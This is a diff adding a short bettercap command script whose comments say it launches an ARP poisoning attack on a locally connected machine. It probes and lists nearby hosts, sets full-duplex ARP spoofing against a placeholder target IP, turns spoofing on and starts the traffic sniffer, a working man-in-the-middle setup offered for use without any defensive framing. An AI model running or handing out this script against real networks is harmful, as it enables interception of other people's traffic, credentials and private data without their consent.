@@ -1,0 +1,20 @@
+//run this script to initiate an arp poisoning attack on a locally connected IP address
+//works in bettercap cli
+
+//enable probing mode to scan nearby networks
+net.probe on
+
+//show all scanned networks
+net.show
+
+//set the arp spoofing to duflex mode for intercepting both ap and target communications
+set arp.spoof.fullduplex true
+
+//OPTIONAL set the target machine to spoof
+set arp.spoof.targets <TARGET_IP>
+
+//turn on arpspoof module
+arp.spoof on
+
+//turn on sniffer module
+net.sniff on
